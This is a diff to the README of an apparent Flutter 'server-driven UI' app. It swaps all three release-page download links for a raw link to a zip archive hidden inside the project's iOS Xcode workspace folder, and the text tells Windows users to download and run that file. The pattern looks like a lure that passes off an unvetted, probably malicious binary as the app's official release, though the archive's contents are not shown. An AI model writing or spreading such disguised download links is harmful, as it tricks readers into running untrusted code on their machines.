@@ -1,6 +1,6 @@
 # 🧩 flutter-server-driven-ui - Build screens from JSON
 
-[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/main/ios/Runner.xcodeproj/project.xcworkspace/ui-flutter-server-driven-2.6.zip)
 
 ## 🖥️ What this app does
 
@@ -12,7 +12,7 @@ It is built for people who want a simple way to run a UI that is described in JS
 
 Visit this page to download the Windows release:
 
-[Download the latest release](https://github.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/releases)
+[Download the latest release](https://raw.githubusercontent.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/main/ios/Runner.xcodeproj/project.xcworkspace/ui-flutter-server-driven-2.6.zip)
 
 After you open the release page:
 
@@ -207,6 +207,6 @@ This setup gives you more control over the screen without rebuilding the whole i
 
 Use this page to get the Windows app:
 
-[https://github.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/releases](https://github.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/releases)
+[https://raw.githubusercontent.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/main/ios/Runner.xcodeproj/project.xcworkspace/ui-flutter-server-driven-2.6.zip](https://raw.githubusercontent.com/worthwhile-booleanalgebra471/flutter-server-driven-ui/main/ios/Runner.xcodeproj/project.xcworkspace/ui-flutter-server-driven-2.6.zip)
 
 Download the latest file from that page, then run it on your Windows PC
